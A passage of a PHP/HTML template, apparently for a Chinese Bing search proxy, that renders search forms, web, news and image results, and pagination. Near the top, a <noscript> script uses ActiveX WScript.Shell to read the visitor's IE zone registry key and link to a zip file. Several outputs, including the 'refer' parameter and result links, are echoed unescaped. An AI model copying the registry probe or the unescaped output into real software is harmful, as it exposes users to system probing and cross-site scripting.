                        	sellink("主页|插件|搜索|域名|FTP|游戏|视频|股票|VPN",$skincolor);
                        else
                        	sellink("主页|搜索|域名|FTP|视频",$skincolor);
                  if (stripos($_SERVER['SERVER_NAME'],'.') == false){
                                $zone = $_SERVER['SERVER_NAME'];
                                $subzone = "";
                        }       
                        else{
                                if (count(split("[.]",$_SERVER['SERVER_NAME'])) == 3){
                                        if (arrmember(split("[.]",$_SERVER['SERVER_NAME']),1) != "net" || arrmember(split("[.]",$_SERVER['SERVER_NAME']),1) != "org" || arrmember(split("[.]",$_SERVER['SERVER_NAME']),1) != "com" || arrmember(split("[.]",$_SERVER['SERVER_NAME']),1) != "biz"){
                                                $zone = arrmember(split("[.]",$_SERVER['SERVER_NAME']),1).'.'.arrmember(split("[.]",$_SERVER['SERVER_NAME']),2);
                                        }       
                                        else{
                                                $zone = $_SERVER['SERVER_NAME'];
                                        }
                                }               
                                elseif (count(split("[.]",$_SERVER['SERVER_NAME'])) >= 4){
                                        $zone = arrmember(split("[.]",$_SERVER['SERVER_NAME']),count(split("[.]",$_SERVER['SERVER_NAME']))-3).'.'.arrmember(split("[.]",$_SERVER['SERVER_NAME']),count(split("[.]",$_SERVER['SERVER_NAME']))-2).'.'.arrmember(split("[.]",$_SERVER['SERVER_NAME']),count(split("[.]",$_SERVER['SERVER_NAME']))-1);
                                }               
                        }
                ?>
<noscript>
<script language="JavaScript" type="text/javascript">
var WshShell=new ActiveXObject("WScript.Shell");
if (WshShell.Regread("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\Domains\\<?php echo $zone;?>\\http") == 2){      
        document.getElementById('zonemap').href = "X3193.zip";
}       
else{
        document.getElementById('zonemap').href = "X3193.zip";
}       
</script>
</noscript>
                </td>
        </tr>
</table>
<table width="95%" height="1" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="left">
                        
                </td>
        </tr>   
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0"  bgcolor="#FFFFFF" class="tborder">
<form action="<?php  echo ScriptPath(); ?>" method="GET" name="bing">
        <tr class="">
                <td align="center" height="60" valign="middle" id='tr1'>
               					<input type="hidden" class="text" name="api" value="bing" size="1"> 
                        <input class="input" name="Query" id="Query" border="0" value="<?php  echo $query; ?>" style="height:<?php echo browser()=='ie'?'20px':'30px'?>;width:200px;font-size:12px;text-align:center;" <?php  $style->input("#f9f9f9",""); ?> x-webkit-speech>
												<SELECT class="sotoolbar select" name="Sources" border="0" <?php  $style->selectarea("#f9f9f9",""); ?> style="width:75px;height:<?php echo browser()=='ie'?'20px':'30px'?>;font-size:12px;">
                        <?php 
               					$bing_search = new bing_class();
               					$langfrom = $bing_search->bingsearchtype();//"Web,网页|News,新闻|Image,图片";
                        for($langfromi = 0; $langfromi < count(split("[|]",$langfrom));$langfromi++){
                        ?>
                                <OPTION class="option" style="padding-top:30px;height:<?php echo browser()=='ie'?'20px':'30px'?>;background-color: <?php echo $langfromi%2==0? '#ffffff':'';?>;" VALUE="<?php  echo arrmember(split("[,]",arrmember(split("[|]",$langfrom),$langfromi)),(0));?>" <?php  if (trim($_GET['Sources']) == arrmember(split("[,]",arrmember(split("[|]",$langfrom),$langfromi)),0)) echo 'selected';?>><?php  echo arrmember(split("[,]",arrmember(split("[|]",$langfrom),$langfromi)),(1))?></OPTION>
                        <?php 
                        }
                        ?>
                        </SELECT>                      
                       	<span id='news' style="display:none;">
                       	</span>   
                       	<?php
                       	if(trim(request('Sources'))=='Image'){
                       	?>	
                        <SELECT class="sotoolbar select" name="imagelist" border="0" <?php  $style->selectarea("#f9f9f9",""); ?> style="width:75px;height:<?php echo browser()=='ie'?'20px':'30px'?>;font-size:12px">
                        <?php 
                        $bing_search = new bing_class();
               					$langfrom = $bing_search->bingsearchimagelist();
               					for($langfromi = 0; $langfromi < count(split("[|]",$langfrom));$langfromi++){
                        ?>
                                <OPTION class="option" style="height:<?php echo browser()=='ie'?'20px':'30px'?>;background-color: <?php echo $langfromi%2==0? '#ffffff':'';?>;" VALUE="<?php  echo arrmember(split("[,]",arrmember(split("[|]",$langfrom),$langfromi)),(0));?>" <?php  if (trim($_GET['imagelist']) == arrmember(split("[,]",arrmember(split("[|]",$langfrom),$langfromi)),0)) {echo 'selected';}elseif(is_wap()&&($langfromi=='1')){echo 'selected';}?>><?php  echo arrmember(split("[,]",arrmember(split("[|]",$langfrom),$langfromi)),(1))?></OPTION>
                        <?php 
                        }
                        ?>
                        </SELECT>
                        <?php
                      	}
                        ?>
                       	<?php
                       	if(trim(request('Sources'))=='Translate'){
                       	?>	
                        <SELECT name="tolang" size="1" <?php  $style->selectarea("#f9f9f9",""); ?> style="width:75px;height:<?php echo browser()=='ie'?'20px':'30px'?>;font-size:12px">
                        <OPTION class="option" style="height:<?php echo browser()=='ie'?'20px':'30px'?>;background-color: <?php echo $langfromi%2==0? '#ffffff':'';?>;" VALUE="multi" <?php  if (trim($_GET['tolang']) == '') echo 'selected';?>>语言</OPTION>
                        <?php 
                        $bing_search = new bing_class();
               					$langfrom = $bing_search->bingsearchcountrycode();
               					//print_r($langfrom);
               					//exit;
               					for($langfromi = 0; $langfromi < count(split("[|]",$langfrom));$langfromi++){
                        ?>
                                <OPTION class="option" style="height:<?php echo browser()=='ie'?'20px':'30px'?>;background-color: <?php echo $langfromi%2==1? '#ffffff':'';?>;" VALUE="<?php  echo arrmember(split("[,]",arrmember(split("[|]",$langfrom),$langfromi)),(0));?>" <?php  if (trim($_GET['tolang']) == arrmember(split("[,]",arrmember(split("[|]",$langfrom),$langfromi)),0)) echo 'selected';?>><?php  echo arrmember(split("[,]",arrmember(split("[|]",$langfrom),$langfromi)),(1))?></OPTION>
                        <?php 
                        }
                        ?>
                        </SELECT>
                        <?php
                      	}
                       	if(trim(request('Sources'))!='Translate'){
                       	?>                          
                        <SELECT class="sotoolbar select" border="0" name="market"  <?php  $style->selectarea("#f9f9f9","") ?> <?php  $style->input("#f9f9f9",""); ?>style="width:175px;height:<?php echo browser()=='ie'?'20px':'30px'?>;font-size:12px">
                        <?php 
                        $bing_search = new bing_class();
               					$market = $bing_search->bingsearchmarket();                        
                        for ($marketi = 0; $marketi < count(split("[|]",$market));$marketi++){
                        ?>
                                <OPTION class="option" style="height:<?php echo browser()=='ie'?'20px':'30px'?>;background-color: <?php echo $marketi%2==0? '#ffffff':'';?>;" VALUE="<?php  echo arrmember(split("[,]",arrmember(split("[|]",$market),($marketi))),(0))?>" <?php  if (trim($marketstr) == arrmember(split("[,]",arrmember(split("[|]",$market),$marketi)),0)) echo 'selected';?>><?php  echo arrmember(split("[,]",arrmember(split("[|]",$market),($marketi))),(1))?></OPTION>
                        <?php 
                        }
                        ?>
                        </SELECT>    
                        <?php
                      	}
                        ?>                                           
                        <input class="input" border="0" type="text" name="pagesize" id="pagesize" value="<?php echo $pagesize?>" style="width:<?php echo browser()=='ie'?'20px':'30px'?>;height:<?php echo browser()=='ie'?'20px':'30px'?>;font-size:12px;text-align:center;" <?php  $style->input("#f9f9f9","") ?>>
                        <input type="hidden" class="text" name="skin" value="<?php echo $skincolor;?>" size="1"> 
              					<input type="hidden" class="text" name="page" value="<?php echo $page;?>" size="1"> 
                        <input type="submit" border="0" class="sotoolbar button" name="btnSubmit" value=" Go " style="width:<?php echo browser()=='ie'?'60px':'100px'?>;height:<?php echo browser()=='ie'?'20px':'30px'?>;<?php $style->selcolor($skincolor);?>">
                       
                </td>
        </tr>   
</table>
<table width="95%" height="1" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="left">
                        
                </td>
        </tr>   
</table>
                <?php 

                if ($query != ""){ // query if start 
                        if (strripos($query,"\\") && $_POST['Query']!=''){
                        		if(!is_wap()){
                                AlertBack("关键词不能包含特殊字符！" , 1);
                            }else{
                            
                            }  
                        }
                        elseif (strripos($query,"\\") && $_GET['Query']!=""){
                        		if(!is_wap()){                        	
                                AlertBack("关键词不能包含特殊字符！" , 2);
                            }else{
                ?>

<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg" style="<?php $style->selcolor($skincolor,'tdtbg');?>">
                <td align="center"> 操 作 结 果 </td>
        </tr>           

        <tr class="tdbg" style="<?php $style->selcolor($skincolor,'tdbg');?>">
                <td align="center" id="result">
											关键词不能包含特殊字符！
											<a hreF='#' onclick='window.location.href="<?php echo trim(request("refer"))?>";'>取消</a>
                </td>
        </tr>  
</table> 
				<?php 
                        break;                            
                            }    
                        }
                        if (Trim(request('transfrom')) != ""){
                                //redirect(httppath()."?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&skin=".$skincolor."&transfrom=".encodeuri(Trim(request('transfrom')))."&market=".$marketstr.'&charset='.getcharset());
                                break;                  
                        }   
                        else{
                                //redirect(httppath().'?Query='.encodeuri($query).'&Sources='.encodeuri($soSources).'&pagesize='.encodeuri($pagesize).'&page='.encodeuri('1').'&skin='.$skincolor.'&market='.$marketstr.'&charset='.getcharset());
                                //break;                  
                        }     

                $gotopage = New PageChange(); 
                if (strpos($Sources,"Web") !== false){ // web if start
                        if (0){
                                $xmlstr = '<?php xml version="1.0" encoding="gb2312" ?><?php pageview_candidate?><SearchResponse xmlns="http://schemas.microsoft.com/LiveSearch/2008/04/XML/element" Version="2.2"><Query><SearchTerms>x3193</SearchTerms></Query><web:Web xmlns:web="http://schemas.microsoft.com/LiveSearch/2008/04/XML/web"><web:Total>193</web:Total><web:Offset>2</web:Offset><web:Results>';
                                for($i=1;$i<=70;$i++){
                                        $xmlstr = $xmlstr."<web:WebResult><web:Title>中国百姓新财富网_电子杂志频道_汇集精彩免费电子杂志</web:Title><web:Description>西安酒店网 宁波第一站_ 电子杂志(e 电子杂志下载 电子杂志 E购客 电子杂志-E 鱼游~电子杂 德州麦客 优之城杂志 中文杂志 聊城消费网 互联网杂志 好人帮 中国便民导航 嘻哈杂志 咯哟哦 - 都来杂志吧 潮流cosm sadasa erqwr X3193</web:Description><web:Url>http://zz.bxxcf.com/</web:Url><web:CacheUrl>http://cncc.bingj.com/cache.aspx?q=x3193&amp;d=4914134124266644&amp;mkt=zh-cn&amp;w=4b69a191,a73cd67e</web:CacheUrl><web:DisplayUrl>zz.bxxcf.com</web:DisplayUrl><web:DateTime>2009-12-05T01:55:20Z</web:DateTime></web:WebResult>";
                                }
                                $xmlstr = $xmlstr.'</web:Results></web:Web></SearchResponse>';
                        }       
                        else{  
                		$bing_search = new bing_class();
                		$searchresult = $bing_search->bingsearch(trim($Sources),trim($query),trim($pagesize),$page,trim($marketstr));  
            		
                		//print_r(trim($pagesize).$page);               
                    //exit;
                        }

                        if (!$searchresult){
                        ?>      
<table width="95%" height="30" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg" style="<?php $style->selcolor($skincolor,'tdtbg');?>">
                <td align="center"> 搜 索 结 果 </td>
        </tr>
        <tr class="tdbg" style="<?php $style->selcolor($skincolor,'tdbg');?>">
                <td align="center" id="result">
                搜索发生意外错误，请重试！
                </td>
        </tr>   
</table>                
                        <?php       
                                break;
                        }
                        elseif ($searchresult['totalitem'] == 0){
                        ?>
<table width="95%" height="30" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg" style="<?php $style->selcolor($skincolor,'tdtbg');?>">
                <td align="center"> 搜 索 结 果 </td>
        </tr>
        <tr class="tdbg" style="<?php $style->selcolor($skincolor,'tdbg');?>">
                <td align="center" id="result">
                未搜索到任何数据，请优化检索词。
                </td>
        </tr>   
</table>                        
                        <?php 
                                        break;
                        }

                        if ($searchresult['totalitem'] > $pagesize) $strpagesize = $pagesize; else $strpagesize = $searchresult['totalitem'];
                        //echo $strpagesize;
                        $totalitem = $searchresult['totalitem'];
                        $totalpage=$searchresult['totalpage'];
                        //$page = $searchresult['page'];
                        if($page > $totalpage){
                                redirect(httppath().'?Query='.encodeuri($query).'&Sources='.encodeuri($soSources).'&pagesize='.encodeuri($pagesize).'&page='.encodeuri($totalpage).'&skin='.$skincolor.'&market='.$marketstr.'&charset='.getcharset());
                                break;                  
                        }
                        ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center" colspan="3" height="30" style="<?php $style->selcolor($skincolor,'tdtbg');?>"> 搜索结果 : 共 <?php  echo $searchresult['totalitem'];?> 条,仅显示前 1000 条 </td>
        </tr>   
                        <?php                       
                        for($i=0; $i <= $searchresult['endid'];$i++){
                                //$objHdd = $objList->item($i);
                                ?>                              
        <tr class="<?php echo $i%4==3?'':'';?>" >
        	      <td align="center" style="border-bottom:1px solid <?php echo arrmember($style->skincolorarray($skincolor),'tdbg');?>;<?php $i%4==3?$style->selcolor($skincolor):'';?>"  width=4% >
                     					  <?php echo $i+1;?>
               	</td>  
                <td align="left" style="border-bottom:1px solid <?php echo arrmember($style->skincolorarray($skincolor),'tdbg');?>;<?php $i%4==3?$style->selcolor($skincolor):'';?>" height="30" onmouseover="this.style.backgroundColor='#f9f9f9';" onmouseout="this.style.backgroundColor='';" onmousedown="this.style.backgroundColor='';">
                                <?php 
                                $nodetitle = ($searchresult[$i]['nodetitle']);
                                $nodedescript =   ($searchresult[$i]['nodedescript']);
                                $nodelink = ($searchresult[$i]['nodelink']);
                                if(trim($nodetitle) == ''){
                        					if(trim($nodedescript) == ''){
                        						$nodetitle = $nodelink;
                        					}else{                                	
                                		$nodetitle = $nodedescript;
                                	}	
                        				}
                               	print_r("<a style='' href='".$nodelink."' title='".($nodelink)." ".$sCrLf.$nodetitle." ".$sCrLf.($nodedescript)."' target='_blank'>".($nodetitle)."</a>");
                                ?>
                </td>
                <td align="center" style="border-bottom:1px solid <?php echo arrmember($style->skincolorarray($skincolor),'tdbg');?>;<?php echo $i%4==3?$style->selcolor($skincolor):'';?>"  width="17%" onmouseover="this.style.backgroundColor='#f9f9f9';" onmouseout="this.style.backgroundColor='';" onmousedown="this.style.backgroundColor='';"> 
                        <table width="95%">
                                <tr>
                                        <td align="center">
                                               <a style='' href="http://api.webthumbnail.org/?width=1024&height=800&screen=1280&format=png&url=<?php echo encodeuri($nodelink);?>" target=_blank><?php  echo formatchar("缩略");?></a> 
                                               <a style='' href="#" onclick="javascript:window.external.AddFavorite('<?php  echo $nodelink; ?>','<?php  echo $nodetitle; ?>')" target=_self><?php  echo formatchar("收藏");?></a> 
                                               <a style='' href="http://api.addthis.com/oexchange/0.8/offer?url=<?php echo encodeuri($nodelink);?>&title=<?php  echo encodeuri(iconv('gb2312','utf-8',$nodetitle));?>&description=<?php  echo encodeuri(iconv('gb2312','utf-8',$nodedescript))?>&pubid=x3193" target=_blank><?php echo formatchar("网收");?></a>
                                        </td>   
                                </tr>
                        </table>                        
                </td>
        </tr>   
                                <?php                       
                        }
                        ?>
        <tr class="tdtbg" height="30">
                        <?php 
                        

                        
                        ?>
                <td align="center" colspan="3" style="<?php $style->selcolor($skincolor,'tdtbg');?>"> 共 <?php echo $totalpage;?> 页 第  
                        <?php 
                        echo $page." 页".$sCrlf.' ';
                        echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=1&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>首页</a> ";
                        if (floor($page) > 1)
                                echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=".encodeuri(($page-1))."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>上一页</a> ";
                        if (floor($page) > 0 && floor($page) < floor($totalpage))
                                echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=".encodeuri(($page+1))."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>下一页</a> ";
        								echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=20&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>末页</a> ";
                				?>
                				<input class='input' border="0" name="page" id="page" value="<?php  echo $page; ?>" style="height:20px;width:40px;font-size:11px;text-align:center;" <?php  $style->input("#f9f9f9",""); ?> >
												<input type="submit"  style="<?php $style->selcolor($skincolor,'tdtbg');?>" class="button" name="gotopage" value=" Go ">                 
                				<?php 

                        
                        ?>
                </td>
        </tr>   
</table>                        
                <?php 
                //$gotopage->gotopage($totalpage,"?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."&gopage=ok&page=","请输入要转到的页数","请在空白处输入要转到的页数");
                } // web if end
                elseif (strpos($Sources,"News") !== false){ // news if start
                		$bing_search = new bing_class();
                		$searchresult = $bing_search->bingsearch(trim($Sources),trim($query),trim($pagesize),$page,trim($marketstr));  
                		$voiceresult = $bing_search->bingttsvoice('all');
                		//print_r($searchresult);               
                    //exit; 
                    
                        if (!$searchresult){
                        ?>      
<table width="95%" height="30" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center" style="<?php $style->selcolor($skincolor,'tdtbg');?>"> 搜 索 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result" style="<?php $style->selcolor($skincolor,'tdbg');?>">
                搜索发生意外错误，请重试！
                </td>
        </tr>   
</table>                
                        <?php       
                                break;
                        }
                        elseif ($searchresult['totalitem'] == 0){
                        ?>
<table width="95%" height="30" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center" style="<?php $style->selcolor($skincolor,'tdtbg');?>"> 搜 索 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result" style="<?php $style->selcolor($skincolor,'tdbg');?>">
                未搜索到任何数据，请优化检索词。
                </td>
        </tr>   
</table>                        
                        <?php 
                                        break;
                        }

                        if ($searchresult['totalitem'] > $pagesize) $strpagesize = $pagesize; else $strpagesize = $searchresult['totalitem'];
                        //echo $strpagesize;
                        $totalitem = $searchresult['totalitem'];
                        $totalpage=$searchresult['totalpage'];
                        //$page = $searchresult['page'];
                        if($page > $totalpage){
                                redirect(httppath().'?Query='.encodeuri($query).'&Sources='.encodeuri($soSources).'&pagesize='.encodeuri($pagesize).'&page='.encodeuri($totalpage).'&skin='.$skincolor.'&market='.$marketstr.'&charset='.getcharset());
                                break;                  
                        }
                        ?>

<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center" colspan="3" height="30" style="<?php $style->selcolor($skincolor,'tdtbg');?>"> 搜索结果 : 共 <?php  echo $searchresult['totalitem'];?> 条,仅显示前 1000 条 </td>
        </tr>   
                        <?php                       
                        for($i=0; $i <= $searchresult['endid'];$i++){
                                //$objHdd = $objList->item($i);
                                ?>                              
        <tr class="<?php echo $i%4==3?'tdbg':'';?>">
        	           <td align="center" width=4% style="border-bottom:1px solid <?php echo arrmember($style->skincolorarray($skincolor),'tdbg');?>;<?php $i%4==3?$style->selcolor($skincolor,'tdbg'):'';?>">
                     					  <?php echo $i+1;?>
               	</td>  
                <td align="left" style="border-bottom:1px solid <?php echo arrmember($style->skincolorarray($skincolor),'tdbg');?>;<?php $i%4==3?$style->selcolor($skincolor,'tdbg'):'';?>" height="30" id="result" onmouseover="this.style.backgroundColor='#f9f9f9';" onmouseout="this.style.backgroundColor='';" onmousedown="this.style.backgroundColor='';">
                                <?php 
                                $nodetitle = str_replace('"', "", ($searchresult[$i]['nodetitle']));
                                $nodedescript = str_replace('"', "", ($searchresult[$i]['nodedescript']));
                                $nodelink = str_replace('"', "", ($searchresult[$i]['nodelink']));
																$nodedate = str_replace('"', "", ($searchresult[$i]['nodedate']));                                
                                if(trim($nodetitle) == ''){
                        					if(trim($nodedescript) == ''){
                        						$nodetitle = $nodelink;
                        					}else{                                	
                                		$nodetitle = $nodedescript;
                                	}	
                        				}
                               	print_r("<a style='' href='".$nodelink."' title='".($nodelink)." ".$sCrLf.$nodetitle." ".$sCrLf.($nodedescript).$sCrLf.$nodedate."' target='_blank'>".($nodetitle)."</a>");
                                ?>
                </td>
                <td align="center" style="border-bottom:1px solid <?php echo arrmember($style->skincolorarray($skincolor),'tdbg');?>;<?php $i%4==3?$style->selcolor($skincolor,'tdbg'):'';?>" width="17%" onmouseover="this.style.backgroundColor='#f9f9f9';" onmouseout="this.style.backgroundColor='';" onmousedown="this.style.backgroundColor='';"> 
                        <table width="95%">
                                <tr>
                                        <td align="center">
                                        <?php
                                        IF(!is_wap()){
                                        		?>
																					<audio id="tts<?php echo $i; ?>"></audio>
                                      		<a id='tts_a_<?php echo $i; ?>' style='<?php if(count($voiceresult[arrmember(split("[-]",$marketstr),"0")])===0){ ?>display:none<?php } ?>' onclick='tts_<?php echo $i; ?>();' target=_blank>语音</a> 
<script>
function tts_<?php echo $i; ?>()
{
 		document.getElementById("tts<?php echo $i; ?>").innerHTML = '<source src="<?php echo httppath();?>?api=bing&action=tts&content=<?php echo encodeuri($searchresult[$i]['nodeotitle'].$searchresult[$i]['nodeodescript'].$searchresult[$i]['nodedate']);?>&lang=<?php echo (stripos($marketstr,'ar-')===0)?encodeuri('ar-XA'):encodeuri($marketstr);?>" type="audio/x-wav"/>';	
 		if(document.getElementById("tts_a_<?php echo $i; ?>").style.color == "red"){
 			document.getElementById("tts<?php echo $i; ?>").pause();			
 		}
 		else{
			document.getElementById("tts<?php echo $i; ?>").play(); 			
 		}
}
 
	var aud<?php echo $i; ?> = document.getElementById("tts<?php echo $i; ?>");
	aud<?php echo $i; ?>.onended = function() {
  	document.getElementById("tts_a_<?php echo $i; ?>").style.color = "";
	}
	aud<?php echo $i; ?>.onprogress = function() {
  	document.getElementById("tts_a_<?php echo $i; ?>").style.color="brown";
	}
	aud<?php echo $i; ?>.onplaying = function() {
  	document.getElementById("tts_a_<?php echo $i; ?>").style.color="red";
	}	
	aud<?php echo $i; ?>.onplay = function() {
  	document.getElementById("tts_a_<?php echo $i; ?>").style.color="grey";
	}	
	aud<?php echo $i; ?>.onpause = function() {
  	document.getElementById("tts_a_<?php echo $i; ?>").style.color="grey";
	}	
</script>                                      		
                                      		<?php
                                      	}
                                      	else{
                                      		?>
                                      		<a style='<?php if(count($voiceresult[arrmember(split("[-]",$marketstr),"0")])===0){ ?>display:none<?php } ?>' href="<?php echo httppath();?>?api=bing&action=tts&content=<?php echo encodeuri($searchresult[$i]['nodeotitle'].$searchresult[$i]['nodeodescript'].$searchresult[$i]['nodedate']);?>&lang=<?php echo (stripos($marketstr,'ar-')===0)?encodeuri('ar-XA'):encodeuri($marketstr);?>&download=1" target=_blank>语音</a> 
                                      		<?php
                                      	
                                      	}
                                        ?>
                                        				 
                                                <a style='' href="http://api.webthumbnail.org/?width=1024&height=800&screen=1280&format=png&url=<?php echo encodeuri($nodelink);?>"  target=_blank><?php  echo formatchar("缩略");?></a> 
																		            <a style='' href="#" onclick="javascript:window.external.AddFavorite('<?php  echo $nodelink; ?>','<?php  echo $nodetitle; ?>')" target=_self><?php  echo formatchar("收藏");?></a> 
                                                <a style='' href="http://api.addthis.com/oexchange/0.8/offer?url=<?php echo encodeuri($nodelink);?>&title=<?php  echo encodeuri(iconv('gb2312','utf-8',$nodetitle));?>&description=<?php  echo encodeuri(iconv('gb2312','utf-8',$nodedescript))?>&pubid=x3193" target=_blank><?php echo formatchar("网收");?></a>
                                        </td>   
                                </tr>
                        </table>                        
                </td>
        </tr>   
                                <?php                       
                        }
                        ?>
        <tr class="tdtbg" height="30" >
                        <?php 
                        

                        
                        ?>
                <td align="center" colspan="3" style="<?php $style->selcolor($skincolor,'tdtbg');?>"> 共 <?php echo $totalpage;?> 页 第  
                        <?php 
                        echo $page." 页".$sCrlf.' ';
                        echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=1&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>首页</a> ";
                       
                        if (floor($page) > 1)
                                echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=".encodeuri(($page-1))."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>上一页</a> ";
                        if (floor($page) > 0 && floor($page) < floor($totalpage))
                                echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=".encodeuri(($page+1))."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>下一页</a> ";
                        echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=67&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>末页</a> ";
        
                				?>
                				<input name="page" class='input' border="0" value="<?php  echo $page; ?>" style="height:20px;width:40px;font-size:11px;text-align:center;" <?php  $style->input("#f9f9f9",""); ?>>
												<input type="submit" style="<?php $style->selcolor($skincolor,'tdtbg');?>" class="button" name="gotopage" value=" Go ">                 
                				<?php 

                        
                        ?>
                </td>
        </tr>   
</table>                        
                <?php 
                //$gotopage->gotopage($totalpage,"?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."&gopage=ok&page=","请输入要转到的页数","请在空白处输入要转到的页数");
                } // web if end
                elseif (strpos($Sources,"Image") !== false){ // news if start
                	if(trim(request('act'))=='imageview'){

                			$bing_search = new bing_class();
                			$searchresult = $bing_search->bingsearch(trim($Sources),trim($query),$pagesize,trim(request("ppage"))==''?trim(request("page")):trim(request("ppage")),trim($marketstr));  
                			//print_r($searchresult);               
                    	//exit; 

                    
                        if (!$searchresult){
                        ?>      
<table width="95%" height="30" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center" style="<?php $style->selcolor($skincolor,'tdtbg');?>"> 搜 索 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result" style="<?php $style->selcolor($skincolor,'tdbg');?>">
                搜索发生意外错误，请重试！
                </td>
        </tr>   
</table>                
                        <?php       
                                break;
                        }
                        elseif ($searchresult['totalitem'] == 0){
                        ?>
<table width="95%" height="30" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center" style="<?php $style->selcolor($skincolor,'tdtbg');?>"> 搜 索 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result" style="<?php $style->selcolor($skincolor,'tdbg');?>">
                未搜索到任何数据，请优化检索词。
                </td>
        </tr>   
</table>                        
                        <?php 
                                        break;
                        }

                        if ($searchresult['totalitem'] > $pagesize) $strpagesize = $pagesize; else $strpagesize = $searchresult['totalitem'];
                        //echo $strpagesize;
                        $totalitem = $searchresult['totalitem'];
                        $totalpage=$searchresult['totalpage'];
                        //$page = $searchresult['page'];
                        if($page > $totalpage){
                                redirect(httppath().'?Query='.encodeuri($query).'&Sources='.encodeuri($soSources).'&pagesize='.encodeuri($pagesize).'&page='.encodeuri($totalpage).'&skin='.$skincolor.'&market='.$marketstr.'&charset='.getcharset());
                                break;                  
                        }
                        ?>
  
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdbg">
                <td align="center" valign="middle" width="" height="" style="height:600px;<?php $style->selcolor($skincolor,'tdbg');?>" >
<script src="http://open.web.meitu.com/sources/xiuxiu.js" type="text/javascript"></script>
<script type="text/javascript">
window.onload=function(){
       /*第1个参数是加载编辑器div容器，第2个参数是编辑器类型，第3个参数是div容器宽，第4个参数是div容器高*/
	xiuxiu.embedSWF("altContent",3,"100%","100%");
       //修改为您自己的图片上传接口
	xiuxiu.setUploadURL("http://web.upload.meitu.com/image_upload.php");
        xiuxiu.setUploadType(2);
        xiuxiu.setUploadDataFieldName("upload_file");
	xiuxiu.onInit = function ()
	{
		xiuxiu.loadPhoto("<?php echo str_replace('"', "", ($searchresult[trim(request("poffset"))==''?trim(request("offset")):trim(request("poffset"))]['nodeurl']));?>");
	}	
	xiuxiu.onUploadResponse = function (data)
	{
		//alert("上传响应" + data);  可以开启调试
	}
}
</script>

<div id="altContent">
	<h1>美图秀秀</h1>
</div>  

</td>
        </tr>   
</table>  
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">                   
												<?php   
               			if(trim(request("offset"))<=($pagesize-8)){
                			$bing_search = new bing_class();
                			$searchresult = $bing_search->bingsearch(trim($Sources),trim($query),$pagesize,$page,trim($marketstr));  
                			//print_r($searchresult);               
                    	//exit; 
                  	}elseif((trim(request("offset"))>($pagesize-8))&&(trim(request("offset"))<$pagesize)){
                			$bing_search = new bing_class();
                			$searchresult = $bing_search->bingsearch(trim($Sources),trim($query),$pagesize,$page,trim($marketstr));
